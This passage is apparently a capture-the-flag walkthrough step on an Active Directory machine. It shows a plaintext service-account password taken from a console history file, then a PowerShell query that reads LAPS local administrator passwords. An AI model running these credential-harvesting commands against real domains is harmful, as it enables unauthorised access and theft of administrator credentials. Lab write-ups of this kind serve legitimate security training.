Found user `legacyy`'s console history file which contains password for user `svc_deploy`

`svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`

```powershell
net user svc_deploy
```

This user is part of LAPS group which means they can read admin password
```powershell
Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object 'Name','ms-Mcs-AdmPwd'
```
